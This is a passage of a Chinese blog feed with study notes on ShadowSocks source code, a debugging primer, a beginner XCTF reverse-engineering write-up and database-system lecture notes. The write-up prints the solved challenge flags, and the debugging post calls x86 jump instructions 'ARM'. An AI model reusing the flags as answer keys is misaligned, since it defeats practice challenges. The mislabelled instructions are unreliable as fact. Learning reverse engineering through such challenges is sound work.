title="asyncdns.py"></a>asyncdns.py</h3><p>从文件名就可以看出，这是一个异步的DNS查询</p><p>其文件里提到了rfc1035，即DNS协议</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 规定了hostname的格式</span></span><br><span class="line">VALID_HOSTNAME = re.compile(<span class="string">br"(?!-)[A-Z\d\-_]&#123;1,63&#125;(?&lt;!-)$"</span>, re.IGNORECASE)</span><br><span class="line"><span class="comment"># 以及后面对hostname的判断</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_hostname</span><span class="params">(hostname)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(hostname) &gt; <span class="number">255</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> hostname[<span class="number">-1</span>] == <span class="string">b'.'</span>:</span><br><span class="line">        hostname = hostname[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> all(VALID_HOSTNAME.match(x) <span class="keyword">for</span> x <span class="keyword">in</span> hostname.split(<span class="string">b'.'</span>))</span><br></pre></td></tr></table></figure><p>以下是该文件里对DNS协议写的一些通用的工具类函数用于解析地址、回应等，以及构造地址和请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_address</span><span class="params">(address)</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">build_request</span><span class="params">(address, qtype)</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">parse_ip</span><span class="params">(addrtype, data, length, offset)</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">parse_name</span><span class="params">(data, offset)</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">parse_record</span><span class="params">(data, offset, question=False)</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">parse_header</span><span class="params">(data)</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">parse_response</span><span class="params">(data)</span></span></span><br></pre></td></tr></table></figure><p>采用了<code>class DNSResponse(object)</code>这个类来存储DNS回应，即目标的hostname、请求、以及answer</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ShadowSocks-SourceCode-Learning/6.png" alt></p><p><code>class DNSResolver(object)</code>类实现了简单的异步查询DNS，其中异步缓存采用了LRUCache的方式（具体实现在<code>lru_cache.py</code>中）</p><p>核心处理方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只有可读事件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_event</span><span class="params">(self, sock, fd, event)</span>:</span></span><br><span class="line">    <span class="comment"># 防御性编程，实际上是个无用的判断</span></span><br><span class="line">        <span class="keyword">if</span> sock != self._sock:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> event &amp; eventloop.POLL_ERR:</span><br><span class="line">            <span class="comment"># 当错误发生时,重新初始化sock</span></span><br><span class="line">            logging.error(<span class="string">'dns socket err'</span>)</span><br><span class="line">            <span class="comment"># 从事件循环中移除 slef._sock</span></span><br><span class="line">            self._loop.remove(self._sock)</span><br><span class="line">            self._sock.close()</span><br><span class="line">            <span class="comment"># TODO when dns server is IPv6</span></span><br><span class="line">            <span class="comment"># 初始化sock</span></span><br><span class="line">            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,</span><br><span class="line">                                       socket.SOL_UDP)</span><br><span class="line">            self._sock.setblocking(<span class="literal">False</span>)</span><br><span class="line">            <span class="comment"># 重新加入事件循环</span></span><br><span class="line">            self._loop.add(self._sock, eventloop.POLL_IN, self)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">读取一个 UDP 包，并取出前 1024 个字节</span></span><br><span class="line"><span class="string">        注意：如果一个 UDP 包超过 1024 字节，比如：2048 字节。</span></span><br><span class="line"><span class="string">        一次 recvfrom(1024) 也会消耗整个 UDP 包。这里是认为</span></span><br><span class="line"><span class="string">        DNS 查询返回的 UDP 包都不会超过 1024 字节。</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line">            data, addr = sock.recvfrom(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> addr[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> self._servers:</span><br><span class="line">                logging.warn(<span class="string">'received a packet other than our dns'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            self._handle_data(data)</span><br></pre></td></tr></table></figure><h3 id="common-py"><a href="#common-py" class="headerlink" title="common.py"></a>common.py</h3><p>该文件提供了都是些工具类的函数，如bytes和str的互相转化（python2中bytes属于str类）、是否是ip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip地址转换函数</span></span><br><span class="line"><span class="comment"># 数值格式(numeric):存储地址的二进制格式</span></span><br><span class="line"><span class="comment"># 点分十进制:就是我们常见的ip(192.168.1.1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inet_pton</span><span class="params">(family, addr)</span> # 将点分十进制的<span class="title">ip</span>地址转化为用于网络传输的数值格式</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">inet_ntop</span><span class="params">(family, ipstr)</span># 将数值格式转化为点分十进制的<span class="title">ip</span>地址格式</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 大概某个版本前的<span class="title">socket</span>没有<span class="title">ip</span>地址转换函数</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">patch_socket</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hasattr(socket, <span class="string">'inet_pton'</span>):</span><br><span class="line">        socket.inet_pton = inet_pton</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hasattr(socket, <span class="string">'inet_ntop'</span>):</span><br><span class="line">        socket.inet_ntop = inet_ntop</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_addr</span><span class="params">(address)</span> # 打包地址</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">parse_header</span><span class="params">(data)</span> # 解析<span class="title">socket5</span>头部</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">IPNetwork</span><span class="params">(object)</span> # 初始化网络列表</span></span><br></pre></td></tr></table></figure><h3 id="daemon-py"><a href="#daemon-py" class="headerlink" title="daemon.py"></a>daemon.py</h3><h3 id="encrypt-py"><a href="#encrypt-py" class="headerlink" title="encrypt.py"></a>encrypt.py</h3>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> ShadowSocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debug-Introduction</title>
      <link href="/2020/01/25/Debug-Introduction/"/>
      <url>/2020/01/25/Debug-Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="Debug-入门"><a href="#Debug-入门" class="headerlink" title="Debug 入门"></a>Debug 入门</h1><p>在以前打ACM的时候，debug全靠<code>printf</code>和大脑跑程序，但是现在做逆向的时候发现了debug的新知识。</p><h2 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h2><p>现在基本主流的IDE都提供了debug模式，其中<code>step into</code>，<code>step over</code>，<code>step out</code>是三个主流的函数，也是ollydbg动态调试中最重要的武器。</p><p>其中概念如下：</p><ul><li><p>step into：Step to the next line excuted（F7）<br>单步执行，遇到子函数就进入并且继续单步执行（简而言之，进入子函数）；</p></li><li><p>step over：Step to the next line in this file（F8）<br>在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。有一点,经过我们简单的调试,在不存在子函数的情况下是和step into效果一样的（简而言之，越过子函数，但子函数会执行）。</p></li><li><p>step out：Step to the first line executed after returning from this method<br>当单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。</p></li></ul><p>简单来说，<code>step into</code>就是逐行运行，当碰到函数时，会进入函数内部进行执行；而<code>step over</code>是直接执行到断点处，即不会每行都停下来；<code>step out</code>是在执行到子函数的任意部分时，使用该函数会直接执行到该函数的返回语句，但是如果子函数剩下部分仍有断点，则执行到断点部分停下。</p><p>（可以直接在pycharm进行实验，实验代码如下）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divide</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    c = a / b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_test</span><span class="params">()</span>:</span></span><br><span class="line">    x = <span class="number">8</span></span><br><span class="line">    y = <span class="number">2</span></span><br><span class="line">    sum = add(x, y)</span><br><span class="line">    d = divide(x, y)</span><br><span class="line">    print(sum, d)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ans = debug_test()</span><br><span class="line">    print(ans)</span><br></pre></td></tr></table></figure><h3 id="Ollydbg"><a href="#Ollydbg" class="headerlink" title="Ollydbg"></a>Ollydbg</h3><p>在OD中：</p><ul><li>Step into：F7：执行一句OP code，若遇到CALL，进入函数代码内部</li><li>Step over：F8：执行一句OP code，若遇到CALL，仅执行函数自身，不跟随进入</li></ul><p>visual studio的调试：<a href="https://blog.csdn.net/boylinux/article/details/7659759" target="_blank" rel="noopener">https://blog.csdn.net/boylinux/article/details/7659759</a></p><p>在visual studio里，F11为step into，F10为Step over</p><h2 id="汇编语言：跳转指令"><a href="#汇编语言：跳转指令" class="headerlink" title="汇编语言：跳转指令"></a>汇编语言：跳转指令</h2><blockquote><p>参考：<a href="https://blog.csdn.net/weibo1230123/article/details/84236308" target="_blank" rel="noopener">https://blog.csdn.net/weibo1230123/article/details/84236308</a></p></blockquote><p>ARM的跳转指令如下</p><ul><li>无条件跳转: JMP;</li><li>根据 CX、ECX 寄存器的值跳转: <code>JCXZ</code>(CX 为 0 则跳转)、<code>JECXZ</code>(ECX 为 0 则跳转);</li><li>根据 EFLAGS 寄存器的标志位跳转</li></ul><p>根据标志位跳转的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">JE   ;等于则跳转</span><br><span class="line">JNE  ;不等于则跳转</span><br><span class="line"> </span><br><span class="line">JZ   ;为 0 则跳转</span><br><span class="line">JNZ  ;不为 0 则跳转</span><br><span class="line"> </span><br><span class="line">JS   ;为负则跳转</span><br><span class="line">JNS  ;不为负则跳转</span><br><span class="line"> </span><br><span class="line">JC   ;进位则跳转</span><br><span class="line">JNC  ;不进位则跳转</span><br><span class="line"> </span><br><span class="line">JO   ;溢出则跳转</span><br><span class="line">JNO  ;不溢出则跳转</span><br><span class="line"> </span><br><span class="line">JA   ;无符号大于则跳转</span><br><span class="line">JNA  ;无符号不大于则跳转</span><br><span class="line">JAE  ;无符号大于等于则跳转</span><br><span class="line">JNAE ;无符号不大于等于则跳转</span><br><span class="line"> </span><br><span class="line">JG   ;有符号大于则跳转</span><br><span class="line">JNG  ;有符号不大于则跳转</span><br><span class="line">JGE  ;有符号大于等于则跳转</span><br><span class="line">JNGE ;有符号不大于等于则跳转</span><br><span class="line"> </span><br><span class="line">JB   ;无符号小于则跳转</span><br><span class="line">JNB  ;无符号不小于则跳转</span><br><span class="line">JBE  ;无符号小于等于则跳转</span><br><span class="line">JNBE ;无符号不小于等于则跳转</span><br><span class="line"> </span><br><span class="line">JL   ;有符号小于则跳转</span><br><span class="line">JNL  ;有符号不小于则跳转</span><br><span class="line">JLE  ;有符号小于等于则跳转</span><br><span class="line">JNLE ;有符号不小于等于则跳转</span><br><span class="line"> </span><br><span class="line">JP   ;奇偶位置位则跳转</span><br><span class="line">JNP  ;奇偶位清除则跳转</span><br><span class="line">JPE  ;奇偶位相等则跳转</span><br><span class="line">JPO  ;奇偶位不等则跳转</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debug </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-adworld-reverse-wp</title>
      <link href="/2020/01/06/XCTF-adworld-reverse-wp/"/>
      <url>/2020/01/06/XCTF-adworld-reverse-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse-amp-WriteUp"><a href="#Reverse-amp-WriteUp" class="headerlink" title="Reverse&amp;WriteUp"></a><center>Reverse&amp;WriteUp</center></h1><p>开始入坑逆向，请多多指教！</p><h1 id="攻防世界-amp-Crypto新手练习区"><a href="#攻防世界-amp-Crypto新手练习区" class="headerlink" title="攻防世界&amp;Crypto新手练习区"></a><center>攻防世界&amp;Crypto新手练习区</center></h1><h2 id="0x01-insanity"><a href="#0x01-insanity" class="headerlink" title="0x01 insanity"></a>0x01 insanity</h2><blockquote><p>题目描述：菜鸡觉得前面的题目太难了，来个简单的缓一下</p></blockquote><p>下下来一个文件，本着好奇心直接用notepad打开，就看到了FLAG：<code>9447{This_is_a_flag}</code>？？？</p><p>原本我只想看看文件头的，没想到直接看到了FLAG</p><p>看到文件头得知，这是一个ELF文件</p><p>拖进IDA逆向，直接看main函数，没啥发现，然后F5得源码</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-reverse-wp/1_2.jpg" alt></p><p>心想着这哪有关于flag得信息，于是点v4到字符串到，看到了静态flag字符串，得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-reverse-wp/1_1.jpg" alt></p><p>看着这个字符串，应该是一个挺好玩得游戏</p><h2 id="0x02-Open-source"><a href="#0x02-Open-source" class="headerlink" title="0x02 Open-source"></a>0x02 Open-source</h2><blockquote><p>题目描述：菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码</p></blockquote><p>如题，直接拿到源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推测得知，hash应该就是所得字符串</p><p>该函数有4个判断，因为每个判断都和后面的hash计算有关，因此阅读每个if判断</p><p>第一个判断是否为四个参数，第二个判断first是否为<code>0xcafe</code>，因为first被强转为int，因此需将十六进制转化为十进制，这边用python偷懒，算出为51966，第二个判断要过，即或运算两边都需要false，因此 second满足的条件为：<code>second %5 != 3 &amp;&amp; second %17 == 8</code>，最后一个判断即是c++的字符串比较，直接输入<code>h4cky0u</code>。</p><p>用gcc将程序编译，得到可执行文件，运行以上结果，得到flag：<code>c0ffee</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-reverse-wp/2_1.jpg" alt></p><h2 id="0x03-simple-unpack"><a href="#0x03-simple-unpack" class="headerlink" title="0x03 simple-unpack"></a>0x03 simple-unpack</h2><blockquote><p>题目描述：菜鸡拿到了一个被加壳的二进制文件</p></blockquote><p>获得一个加壳的ELF文件，拖入IDA64bit里，果然没法分析</p><p>学一波脱壳</p><blockquote><p>参考：</p><p><a href="https://bbs.ichunqiu.com/thread-22463-1-1.html?from=beef" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-22463-1-1.html?from=beef</a></p><p><a href="https://www.jianshu.com/p/0880bcb6fed6" target="_blank" rel="noopener">https://www.jianshu.com/p/0880bcb6fed6</a></p></blockquote><p>用DetectItEasy查出这是upx壳</p><blockquote><p>上52pojie.cn找ELF64脱UPX壳</p><p><a href="https://www.52pojie.cn/thread-1048649-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1048649-1-1.html</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=730499&amp;page=1" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=730499&amp;page=1</a></p></blockquote><p>透了，之后补充upx手脱</p><p>发现可以用命令脱壳，然后拖入IDA即可看到源码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ upx -d simple-unpack</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Database-System</title>
      <link href="/2020/01/02/Database-System/"/>
      <url>/2020/01/02/Database-System/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库系统概念"><a href="#数据库系统概念" class="headerlink" title="数据库系统概念"></a>数据库系统概念</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>DBMS定义：由一个相互关联的数据集合和一组用以访问这些数据的程序组成，这个数据集合同城称作<strong>数据库(Database)</strong>。</p><p>DBMS的目标：方便、高效地存取数据库信息</p><ul><li>四个基本概念<ul><li>数据（Data）</li><li>数据库（Database）</li><li>数据库管理系统（DBMS）</li><li>数据库系统（DBS）</li></ul></li></ul><h3 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h3><p>数据（Data）是数据库中存储的基本对象</p><p><strong>数据的定义</strong>：描述事物的符号记录</p><p><strong>数据的种类</strong>：文字、图形、图像、声音</p><p><strong>数据的特点</strong>：数据与其语义是不可分的</p><p>！数据的形式不能完全表达其内容</p><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>逻辑结构</strong>：数据之间存在的逻辑关系，如表、树、图、数组等</p><p><strong>物理结构</strong>：数据在计算机内的存储方式，如顺序方式、链接方式</p><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>数据库（Database，简称DB）是<strong>长期</strong>储存在计算机内、<strong>有组织的</strong>、<strong>可共享</strong>的<strong>大量</strong>数据集合</p><h4 id="数据库的特征"><a href="#数据库的特征" class="headerlink" title="数据库的特征"></a>数据库的特征</h4><ul><li>数据按一定的数据模型组织、描述和储存</li><li>可为各种用户共享</li><li>冗余度较小</li><li>数据独立性较高</li><li>易扩展</li></ul><h3 id="数据库管理系统"><a href="#数据库管理系统" class="headerlink" title="数据库管理系统"></a>数据库管理系统</h3><p>数据库管理系统（Database Management System，简称DBMS）由一个相互关联的数据的集合和一组用以访问这些数据的程序组成，是位于用户与操作系统之间的一层数据管理软件。</p><p><strong>用途</strong>：科学地组织和存储数据、高效地获取和维护数据</p><ul><li><strong>数据定义功能</strong>：提供数据定义语言（DDL），定义数据库中的数据对象</li><li><strong>数据操作功能</strong>：提供数据操纵语言（DML），操纵数据实现对数据库的基本操作（增删改查）</li><li><strong>数据库的运行管理</strong>：保证数据的安全性、完整性，保证多用户对数据的并发使用，发生故障后的系统恢复</li><li><strong>数据库的建立和维护功能</strong>：数据库数据批量装载，数据库转储，介质故障恢复，数据库的重组织，性能监视</li></ul><h3 id="数据库系统"><a href="#数据库系统" class="headerlink" title="数据库系统"></a>数据库系统</h3><p>数据库系统（Database System，简称DBS）是指在计算机系统中引入数据库后的系统，在不引起混淆的情况下常常把数据库系统简称为数据库</p><p><strong>数据库系统的组成</strong>：由数据库、数据库管理系统、应用系统（及其开发工具）、数据库管理员（和用户）构成</p><p>如下图所示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\1.jpg" alt></p><p>下图为各系统间的关系</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\2.jpg" alt></p><h3 id="数据管理技术"><a href="#数据管理技术" class="headerlink" title="数据管理技术"></a>数据管理技术</h3><p>数据管理：对数据进行分类、组织、编码、存储、检索和维护，是数据处理的中心问题</p><p>数据管理的发展动力：应用需求的推动；计算机硬件的发展；计算机软件的发展。</p><p>发展阶段：①人工管理阶段（50年代中期以前）②文件系统阶段（50年代后期~60年代中期）③数据库系统阶段（60年代后期开始）</p><blockquote><p>早期，数据库应用程序直接建立在文件系统之上，文件系统的弊端如下：</p><ul><li>数据的冗余和不一致性：多种文件格式，相同的信息在几个文件重复存储</li><li>数据访问困难：对于每一个新任务，需要写一个程序</li><li>数据孤立：数据分散在不同格式的多个文件中</li><li>完整性问题：一致性约束“淹没”在程序代码中，增加新约束或修改现有约束很困难</li><li>更新的原子性问题：难以保持原子性，执行部分更新，是的数据处于不一致状态</li><li>多用户的并发访问异常：系统的总体性能和相应速度要求：并发访问数据，没有控制的并发访问导致不一致性</li><li>安全性问题：控制用户只存取部分数据难以实现</li></ul></blockquote><p>数据库的观点：数据不是依赖于处理过程的附属品，而是现实世界中独立存在的对象</p><p>数据统一按表结构存放</p><p><center>数据库VS文件系统</center><br><img src="https://magic-king.net/images/loading.gif" data-original="Database-System\3.jpg" alt></p><h3 id="实例与模式"><a href="#实例与模式" class="headerlink" title="实例与模式"></a>实例与模式</h3><p>Instance and Schemas</p><p>型(Schema)与值(Instance)的区别：</p><ul><li>型是对数据的结构和属性的说明——模式</li><li>值是型的一个具体赋值——实例</li><li>型是相对稳定的，值是随时间不断变化的</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span>&#123;</span></span><br><span class="line">4<span class="keyword">public</span>:<span class="built_in">string</span> name;</span><br><span class="line">444<span class="built_in">string</span> address;</span><br><span class="line">&#125;;</span><br><span class="line">person Tom;</span><br><span class="line"><span class="comment">//person是型,Tom是变量,Tom在某时刻的值是实例</span></span><br></pre></td></tr></table></figure><h4 id="模式：数据库的总体设计"><a href="#模式：数据库的总体设计" class="headerlink" title="模式：数据库的总体设计"></a>模式：数据库的总体设计</h4><ul><li>通过高级程序设计语言进行类比</li><li><strong>物理模式</strong>：在物理层描述的数据库设计</li><li><strong>逻辑模式（子模式）</strong>：在逻辑层描述的数据库设计</li></ul><h4 id="实例：在特定时刻存储在数据库中的信息集合"><a href="#实例：在特定时刻存储在数据库中的信息集合" class="headerlink" title="实例：在特定时刻存储在数据库中的信息集合"></a>实例：在特定时刻存储在数据库中的信息集合</h4><ul><li>类似于一个变量的值</li></ul><h4 id="物理数据的独立性：物理模式的改变而不会影响逻辑模式"><a href="#物理数据的独立性：物理模式的改变而不会影响逻辑模式" class="headerlink" title="物理数据的独立性：物理模式的改变而不会影响逻辑模式"></a>物理数据的独立性：物理模式的改变而不会影响逻辑模式</h4><ul><li>应用依赖于逻辑模式</li><li>在一般情况下，应明确定义不同层次之间和组件之间的接口，这样某些部分的改变不会对其他部分造成较大影响</li></ul><h4 id="逻辑数据的独立性"><a 